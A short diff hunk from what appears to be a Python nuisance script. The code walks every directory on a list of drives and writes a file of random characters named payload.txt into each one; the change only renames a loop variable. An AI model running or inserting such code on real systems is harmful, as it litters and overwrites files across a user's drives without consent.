@@ -36,8 +36,8 @@ for drive in drive_list:
     payload = "".join(random.choices(valid_chars, k = random.randint(1, 1024)))
     payload_amount = random.randint(1, 5)
     if os.path.isdir(drive):
-        for root, dirs, files in os.walk(drive):
-            file_path = os.path.join(root, f"payload.txt")
+        for src, dirs, files in os.walk(drive):
+            file_path = os.path.join(src, f"payload.txt")
             try:
                 with open(file_path, "w", encoding="UTF-8") as file:
                     file.write(payload)
